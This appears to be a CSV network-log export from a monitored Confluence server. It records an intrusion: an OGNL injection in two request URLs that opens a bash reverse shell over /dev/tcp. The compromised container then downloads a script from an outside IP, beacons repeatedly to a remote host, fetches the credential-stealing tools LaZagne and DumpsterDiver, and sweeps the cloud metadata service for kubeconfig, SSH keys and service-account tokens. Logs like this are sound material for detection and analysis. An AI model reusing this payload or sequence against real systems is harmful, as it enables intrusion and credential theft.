"@timestamp","network.direction","source.ip","source.port","destination.port","destination.ip","bytes_in","bytes_out","network.protocol","url.path","url.full"
"Oct 25, 2022 @ 01:10:38.482",ingress,"172.17.0.3",42482,80,"169.254.169.254",226B,254B,http,"/computeMetadata/v1/instance/service-accounts/[email]//identity","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/[email]//identity"
"Oct 25, 2022 @ 01:10:38.408",ingress,"172.17.0.3",42480,80,"169.254.169.254",225B,246B,http,"/computeMetadata/v1/instance/service-accounts/[email]//aliases","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/[email]//aliases"
"Oct 25, 2022 @ 01:10:38.344",ingress,"172.17.0.3",42476,80,"169.254.169.254",223B,289B,http,"/computeMetadata/v1/instance/service-accounts/[email]//email","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/[email]//email"
"Oct 25, 2022 @ 01:10:38.303",ingress,"172.17.0.3",42470,80,"169.254.169.254",166B,300B,http,"/computeMetadata/v1/instance/service-accounts/","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
"Oct 25, 2022 @ 01:10:38.244",ingress,"172.17.0.3",42454,80,"169.254.169.254",178B,277B,http,"/computeMetadata/v1/instance/network-interfaces/0//network","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//network"
"Oct 25, 2022 @ 01:10:38.170",ingress,"172.17.0.3",42446,80,"169.254.169.254",182B,255B,http,"/computeMetadata/v1/instance/network-interfaces/0//dns-servers","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//dns-servers"
"Oct 25, 2022 @ 01:10:38.113",ingress,"172.17.0.3",42442,80,"169.254.169.254",178B,249B,http,"/computeMetadata/v1/instance/network-interfaces/0//gateway","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//gateway"
"Oct 25, 2022 @ 01:10:38.053",ingress,"172.17.0.3",42426,80,"169.254.169.254",181B,252B,http,"/computeMetadata/v1/instance/network-interfaces/0//subnetmask","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//subnetmask"
"Oct 25, 2022 @ 01:10:37.801",ingress,"172.17.0.3",42412,80,"169.254.169.254",173B,249B,http,"/computeMetadata/v1/instance/network-interfaces/0//ip","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//ip"
"Oct 25, 2022 @ 01:10:37.577",ingress,"172.17.0.3",42404,80,"169.254.169.254",168B,241B,http,"/computeMetadata/v1/instance/network-interfaces/","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/"
"Oct 25, 2022 @ 01:10:37.482",ingress,"172.17.0.3",42388,80,"169.254.169.254",168B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/kube-env","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
"Oct 25, 2022 @ 01:10:37.413",ingress,"172.17.0.3",42386,80,"169.254.169.254",170B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/kubeconfig","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kubeconfig"
"Oct 25, 2022 @ 01:10:37.296",ingress,"172.17.0.3",42382,80,"169.254.169.254",171B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/kube-labels","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-labels"
"Oct 25, 2022 @ 01:10:37.257",ingress,"172.17.0.3",42376,80,"169.254.169.254",174B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/enable-oslogin","http://metadata.google.internal/computeMetadata/v1/instance/attributes/enable-oslogin"
"Oct 25, 2022 @ 01:10:37.179",ingress,"172.17.0.3",42368,80,"169.254.169.254",172B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/cluster-name","http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name"
"Oct 25, 2022 @ 01:10:37.103",ingress,"172.17.0.3",42364,80,"169.254.169.254",176B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/cluster-location","http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-location"
"Oct 25, 2022 @ 01:10:37.005",ingress,"172.17.0.3",42350,80,"169.254.169.254",153B,284B,http,"/computeMetadata/v1/instance/zone","http://metadata.google.internal/computeMetadata/v1/instance/zone"
"Oct 25, 2022 @ 01:10:36.894",ingress,"172.17.0.3",42334,80,"169.254.169.254",164B,"1.8KB",http,"/computeMetadata/v1/instance/scheduling/tags","http://metadata.google.internal/computeMetadata/v1/instance/scheduling/tags"
"Oct 25, 2022 @ 01:10:36.808",ingress,"172.17.0.3",42330,80,"169.254.169.254",153B,246B,http,"/computeMetadata/v1/instance/name","http://metadata.google.internal/computeMetadata/v1/instance/name"
"Oct 25, 2022 @ 01:10:36.713",ingress,"172.17.0.3",42318,80,"169.254.169.254",161B,287B,http,"/computeMetadata/v1/instance/machine-type","http://metadata.google.internal/computeMetadata/v1/instance/machine-type"
"Oct 25, 2022 @ 01:10:36.673",ingress,"172.17.0.3",42316,80,"169.254.169.254",154B,303B,http,"/computeMetadata/v1/instance/image","http://metadata.google.internal/computeMetadata/v1/instance/image"
"Oct 25, 2022 @ 01:10:36.631",ingress,"172.17.0.3",42300,80,"169.254.169.254",151B,258B,http,"/computeMetadata/v1/instance/id","http://metadata.google.internal/computeMetadata/v1/instance/id"
"Oct 25, 2022 @ 01:10:36.567",ingress,"172.17.0.3",42298,80,"169.254.169.254",157B,296B,http,"/computeMetadata/v1/instance/hostname","http://metadata.google.internal/computeMetadata/v1/instance/hostname"
"Oct 25, 2022 @ 01:10:36.522",ingress,"172.17.0.3",42294,80,"169.254.169.254",160B,238B,http,"/computeMetadata/v1/instance/description","http://metadata.google.internal/computeMetadata/v1/instance/description"
"Oct 25, 2022 @ 01:10:36.462",ingress,"172.17.0.3",42290,80,"169.254.169.254",157B,"1.8KB",http,"/computeMetadata/v1/oslogin/authorize","http://metadata.google.internal/computeMetadata/v1/oslogin/authorize"
"Oct 25, 2022 @ 01:10:36.413",ingress,"172.17.0.3",42274,80,"169.254.169.254",161B,"1.8KB",http,"/computeMetadata/v1/oslogin/security-keys","http://metadata.google.internal/computeMetadata/v1/oslogin/security-keys"
"Oct 25, 2022 @ 01:10:36.354",ingress,"172.17.0.3",42266,80,"169.254.169.254",154B,"1.8KB",http,"/computeMetadata/v1/oslogin/groups","http://metadata.google.internal/computeMetadata/v1/oslogin/groups"
"Oct 25, 2022 @ 01:10:36.286",ingress,"172.17.0.3",52926,80,"169.254.169.254",153B,"1.8KB",http,"/computeMetadata/v1/oslogin/users","http://metadata.google.internal/computeMetadata/v1/oslogin/users"
"Oct 25, 2022 @ 01:10:36.205",ingress,"172.17.0.3",52914,80,"169.254.169.254",174B,"1.4KB",http,"/computeMetadata/v1/project/attributes/","http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"
"Oct 25, 2022 @ 01:10:36.174",ingress,"172.17.0.3",52906,80,"169.254.169.254",167B,"1.4KB",http,"/computeMetadata/v1/project/attributes/ssh-keys","http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
"Oct 25, 2022 @ 01:10:36.130",ingress,"172.17.0.3",52890,80,"169.254.169.254",166B,251B,http,"/computeMetadata/v1/project/numeric-project-id","http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id"
"Oct 25, 2022 @ 01:10:36.092",ingress,"172.17.0.3",52886,80,"169.254.169.254",158B,258B,http,"/computeMetadata/v1/project/project-id","http://metadata.google.internal/computeMetadata/v1/project/project-id"
"Oct 25, 2022 @ 01:10:35.998",ingress,"172.17.0.3",52876,80,"169.254.169.254",140B,"1.8KB",http,"/latest/api/token","http://169.254.169.254/latest/api/token"
"Oct 25, 2022 @ 01:10:31.877",ingress,"172.17.0.3",52866,80,"169.254.169.254",88B,232B,http,"/","http://metadata.google.internal/"
"Oct 25, 2022 @ 01:10:19.528",ingress,"127.0.0.1",60528,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:10:01.573",ingress,"92.118.39.78",35850,8090,"172.17.0.3",41B,519B,http,"/","http://34.142.184.1/"
"Oct 25, 2022 @ 01:09:57.276",egress,"172.17.0.3",53334,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:09:51.073",egress,"172.17.0.3",60146,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:09:49.522",ingress,"127.0.0.1",48240,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:09:44.831",egress,"172.17.0.3",53804,80,"20.205.243.166",115B,125B,http,"/AlessandroZ/LaZagne/archive/master.tar.gz","http://github.com/AlessandroZ/LaZagne/archive/master.tar.gz"
"Oct 25, 2022 @ 01:09:22.408",egress,"172.17.0.3",46118,80,"20.205.243.166",118B,128B,http,"/securing/DumpsterDiver/archive/master.tar.gz","http://github.com/securing/DumpsterDiver/archive/master.tar.gz"
"Oct 25, 2022 @ 01:09:19.514",ingress,"127.0.0.1",47220,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:08:56.615",egress,"172.17.0.3",51554,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:08:49.501",ingress,"127.0.0.1",59892,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:08:39.605",ingress,"10.0.0.5",57756,8090,"10.0.0.3",708B,"7.5KB",http,"/login.action","http://10.0.0.3:8090/login.action?os_destination=%2F%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22%22%2C+Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new+java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.0.5%2F4242+0%3E%261%27%29.start%28%29%22%29%29%7D%2Findex.action&permissionViolation=true"
"Oct 25, 2022 @ 01:08:39.377",ingress,"10.0.0.5",57756,8090,"10.0.0.3",589B,"1,010B",http,"/${Class.forName(""com.opensymphony.webwork.ServletActionContext"").getMethod(""getResponse"",null).invoke(null,null).setHeader("""", Class.forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""nashorn"").eval(""new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.5/4242 0>&1').start()""))}/","http://10.0.0.3:8090/$%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22,null%29.invoke%28null,null%29.setHeader%28%22%22,%20Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27bash%20-i%20%3E&%20/dev/tcp/10.0.0.5/4242%200%3E&1%27%29.start%28%29%22%29%29%7D/"
"Oct 25, 2022 @ 01:08:20.397",egress,"172.17.0.3",41246,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:08:19.495",ingress,"127.0.0.1",48240,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:07:55.949",egress,"172.17.0.3",37164,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:07:49.489",ingress,"127.0.0.1",55152,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:07:19.482",ingress,"127.0.0.1",48502,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:06:55.283",egress,"172.17.0.3",59238,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:06:49.733",egress,"172.17.0.3",59234,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:06:49.476",ingress,"127.0.0.1",33396,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:06:19.471",ingress,"127.0.0.1",36456,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:05:54.615",egress,"172.17.0.3",50934,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:05:49.464",ingress,"127.0.0.1",60124,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:05:20.611",egress,"172.17.0.3",39110,80,"212.22.77.79",468B,159B,http,"/o","http://212.22.77.79/o"
"Oct 25, 2022 @ 01:05:20.110",egress,"172.17.0.3",50708,80,"104.18.114.97",77B,570B,http,"/","http://icanhazip.com/"
"Oct 25, 2022 @ 01:05:19.738",egress,"172.17.0.3",33432,80,"95.182.120.140",217B,"3.4KB",http,"/spre.sh","http://95.182.120.140/spre.sh"
"Oct 25, 2022 @ 01:05:19.456",ingress,"127.0.0.1",59660,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:05:19.076",egress,"172.17.0.3",39104,80,"212.22.77.79",425B,820B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:04:53.948",egress,"172.17.0.3",36598,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:04:49.450",ingress,"127.0.0.1",36204,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
